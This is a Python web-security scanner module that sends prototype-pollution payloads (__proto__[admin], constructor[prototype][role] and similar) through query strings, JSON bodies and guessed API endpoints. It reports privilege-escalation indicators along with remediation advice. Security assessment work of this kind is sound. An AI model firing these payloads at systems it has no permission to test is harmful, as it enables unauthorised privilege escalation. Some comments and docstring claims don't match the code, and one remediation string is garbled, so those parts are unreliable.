#!/usr/bin/env python3
"""
Prototype Pollution Scanner
-----------------------------
Tests for JavaScript prototype pollution vulnerabilities via:
  • Query parameter injection (__proto__, constructor)
  • JSON body injection
  • URL fragment pollution
  • Header-based pollution
  • Deep nested object pollution
"""

import json
import requests
import concurrent.futures
from typing import List, Dict, Optional
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()

PROTO_PAYLOADS_QS = [
    ("__proto__[admin]", "true"),
    ("__proto__[role]", "admin"),
    ("__proto__[isAdmin]", "1"),
    ("__proto__[debug]", "true"),
    ("constructor[prototype][admin]", "true"),
    ("constructor[prototype][role]", "admin"),
    ("__proto__.admin", "true"),
    ("__proto__[privileged]", "true"),
    ("__proto__[isAuthenticated]", "true"),
    ("__proto__[superuser]", "1"),
]

PROTO_PAYLOADS_JSON = [
    {"__proto__": {"admin": True}},
    {"__proto__": {"role": "admin", "isAdmin": True}},
    {"constructor": {"prototype": {"admin": True}}},
    {"__proto__": {"privileged": True, "debug": True}},
    {"__proto__": {"isAuthenticated": True, "superuser": True}},
    # Deep nested
    {"a": {"__proto__": {"admin": True}}},
    {"a": {"b": {"__proto__": {"admin": True}}}},
]

# Indicators of successful pollution
POLLUTION_INDICATORS = [
    "admin",
    "true",
    "role",
    "privileged",
    "isAdmin",
    "debug",
    "superuser",
    "isAuthenticated",
]

POLLUTION_ERROR_SIGS = [
    "typeerror",
    "cannot set property",
    "object object",
    "prototype",
    "__proto__",
]


class PrototypePollutionScanner:
    """
    Tests JavaScript applications for prototype pollution via multiple vectors.
    Checks both client-side pollution indicators and server-side reflection.
    """

    def __init__(self, target: str, session=None, timeout: int = 10, threads: int = 10):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.threads = threads
        self.session = session or requests.Session()
        self.session.verify = False
        self.session.headers.setdefault(
            "User-Agent", "WebPwnToolkit/2.2 (Authorized Testing)"
        )
        self.results: List[Dict] = []

    def _get(self, url: str, params: dict = None) -> Optional[requests.Response]:
        try:
            return self.session.get(
                url, params=params, timeout=self.timeout, verify=False
            )
        except Exception:
            return None

    def _post_json(self, url: str, payload: dict) -> Optional[requests.Response]:
        try:
            return self.session.post(
                url,
                json=payload,
                headers={"Content-Type": "application/json"},
                timeout=self.timeout,
                verify=False,
            )
        except Exception:
            return None

    def _post_form(self, url: str, data: dict) -> Optional[requests.Response]:
        try:
            return self.session.post(url, data=data, timeout=self.timeout, verify=False)
        except Exception:
            return None

    # ── Baseline capture ────────────────────────────────────────────────

    def _baseline(self, url: str) -> Optional[str]:
        r = self._get(url)
        return r.text[:500] if r else None

    # ── Query-string pollution ───────────────────────────────────────────

    def _test_qs_pollution(self, url: str) -> List[Dict]:
        findings = []
        baseline = self._baseline(url)
        if not baseline:
            return []

        for param, value in PROTO_PAYLOADS_QS:
            # Build raw query string to preserve special chars
            raw_url = f"{url}?{param}={value}"
            try:
                resp = self.session.get(raw_url, timeout=self.timeout, verify=False)
                if not resp:
                    continue
                body = resp.text.lower()

                # Check for server-side error indicating prototype access
                if any(sig in body for sig in POLLUTION_ERROR_SIGS):
                    findings.append(
                        {
                            "url": raw_url,
                            "type": "Prototype Pollution — Server-Side (Query String)",
                            "severity": "high",
                            "cvss": 8.1,
                            "parameter": param,
                            "payload": f"{param}={value}",
                            "detail": f"Server returned prototype-related error for param '{param}'. Possible server-side JS pollution.",
                            "evidence": resp.text[:300],
                            "owasp": "A08:2021 – Software and Data Integrity Failures",
                            "remediation": "Use Object.create(null) for untrusted data. Freeze prototypes. Use schema validation (ajv).",
                        }
                    )
                # Check if response changes significantly (privilege escalation indicator)
                elif resp.text[:500] != baseline and len(resp.text) > 50:
                    if any(
                        ind in body
                        for ind in [
                            "welcome admin",
                            "admin panel",
                            "privileged",
                            "dashboard",
                        ]
                    ):
                        findings.append(
                            {
                                "url": raw_url,
                                "type": "Prototype Pollution — Privilege Escalation (Query String)",
                                "severity": "critical",
                                "cvss": 9.8,
                                "parameter": param,
                                "payload": f"{param}={value}",
                                "detail": f"Admin/privileged content returned after prototype pollution via '{param}'.",
                                "evidence": resp.text[:300],
                                "owasp": "A08:2021 – Software and Data Integrity Failures",
                                "remediation": "Sanitize all incoming keys. Reject keys containing __proto__ or constructor.",
                            }
                        )
            except Exception:
                pass

        return findings

    # ── JSON body pollution ──────────────────────────────────────────────

    def _test_json_pollution(self, url: str) -> List[Dict]:
        findings = []

        for payload in PROTO_PAYLOADS_JSON:
            # Try both GET with JSON and POST with JSON
            for method_fn, method_name in [
                (lambda p: self._post_json(url, p), "POST"),
            ]:
                try:
                    resp = method_fn(payload)
                    if not resp:
                        continue
                    body = resp.text.lower()

                    if any(sig in body for sig in POLLUTION_ERROR_SIGS):
                        findings.append(
                            {
                                "url": url,
                                "type": f"Prototype Pollution — Server-Side ({method_name} JSON)",
                                "severity": "high",
                                "cvss": 8.3,
                                "payload": json.dumps(payload)[:200],
                                "detail": "Server exposed prototype access error in JSON response.",
                                "evidence": resp.text[:300],
                                "owasp": "A08:2021 – Software and Data Integrity Failures",
                                "remediation": "Validate incoming JSON against strict schema. Strip __proto__ / constructor keys.",
                            }
                        )

                    # HTTP 500 or server error with proto payload = server-side execution
                    if resp.status_code == 500 and "__proto__" in json.dumps(payload):
                        findings.append(
                            {
                                "url": url,
                                "type": "Prototype Pollution — Server Error (500) Triggered",
                                "severity": "high",
                                "cvss": 7.5,
                                "payload": json.dumps(payload)[:200],
                                "detail": "Server returned 500 Internal Server Error when __proto__ keys injected.",
                                "evidence": f"HTTP 500 for payload: {json.dumps(payload)[:150]}",
                                "owasp": "A08:2021 – Software and Data Integrity Failures",
                                "remediation": "Implement global error handler. Sanitize JSON keys before processing.",
                            }
                        )
                except Exception:
                    pass

        return findings

    # ── API endpoint pollution ───────────────────────────────────────────

    def _test_api_endpoints(self) -> List[Dict]:
        findings = []
        api_paths = [
            "/api/user",
            "/api/users",
            "/api/profile",
            "/api/settings",
            "/api/config",
            "/api/admin",
            "/api/merge",
            "/api/update",
            "/api/v1/user",
            "/api/v2/user",
        ]
        for path in api_paths:
            url = self.target + path
            for payload in PROTO_PAYLOADS_JSON[:3]:
                resp = self._post_json(url, payload)
                if resp and resp.status_code not in (404, 405):
                    body = resp.text.lower()
                    if any(sig in body for sig in POLLUTION_ERROR_SIGS):
                        findings.append(
                            {
                                "url": url,
                                "type": "Prototype Pollution — API Endpoint Vulnerable",
                                "severity": "high",
                                "cvss": 8.1,
                                "payload": json.dumps(payload)[:150],
                                "detail": f"API endpoint {path} shows prototype pollution indicators.",
                                "evidence": resp.text[:250],
                                "owasp": "A08:2021 – Software and Data Integrity Failures",
                                "remediation": "Use deep object sanitization Senior ware (e.g. sanitize-html, lodash.merge with safeguards).",
                            }
                        )
                        break

        return findings

    # ── Public run ──────────────────────────────────────────────────────

    def run(self) -> List[Dict]:
        console.print(
            f"\n  [bold yellow]▶ Prototype Pollution Scanner on {self.target}[/bold yellow]"
        )

        with Progress(
            SpinnerColumn(),
            TextColumn("[cyan]Testing prototype pollution...[/cyan]"),
            BarColumn(),
            console=console,
        ) as prog:
            task = prog.add_task("proto", total=3)

            # 1. QS pollution on main URL
            prog.advance(task)
            self.results.extend(self._test_qs_pollution(self.target))

            # 2. JSON body pollution on main URL
            prog.advance(task)
            self.results.extend(self._test_json_pollution(self.target))

            # 3. API endpoints
            prog.advance(task)
            self.results.extend(self._test_api_endpoints())

        # Deduplicate
        seen = set()
        unique = []
        for r in self.results:
            key = (r.get("url"), r.get("payload", "")[:50])
            if key not in seen:
                seen.add(key)
                unique.append(r)
        self.results = unique

        color = "red" if self.results else "green"
        console.print(
            f"  [{color}]{len(self.results)} prototype pollution issue(s) found[/]"
        )
        return self.results
